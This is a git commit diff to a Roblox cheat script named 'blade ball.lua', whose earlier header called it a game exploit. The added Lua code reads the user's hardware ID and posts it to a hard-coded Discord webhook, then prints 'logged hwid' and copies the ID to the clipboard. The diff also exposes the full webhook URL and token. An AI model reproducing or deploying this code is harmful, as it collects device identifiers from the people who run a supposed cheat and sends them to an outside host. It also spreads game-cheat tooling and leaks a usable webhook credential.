2a2e28f58aef86bd916207659298960c6e4cbd5b
hacks570 <111669909+hacks570@users.noreply.github.com>
2023-09-28 14:39:07 -0300

    Update blade ball.lua

--- blade ball.lua
+++ blade ball.lua
@@ -1,1 +1,18 @@
--- pure block game exploit
+-- pure block game ```lua
+local webhook_url = "https://discord.com/api/webhooks/1151239423187488839/pdDBWGCYwa1M68igIKh1fM-08g9VuuLBGnd3c-7JI7ECQ2aN9uCzaMr7BZOUw89yhUqP"
+local dataMessage = string.format("your HWID is:" .. HWID) -- change "text" to whatever u want
+http_request(
+    {
+        Url = webhook_url,
+        Method = "POST",
+        Headers = {
+            ["Content-Type"] = "application/json"
+        },
+        Body = game:GetService("HttpService"):JSONEncode({["content"] = dataMessage})
+    }
+)
+
+print ("logged hwid") 
+
+setclipboard("Your HWID:" .. HWID)
+toclipboard("Your HWID:" .. HWID)
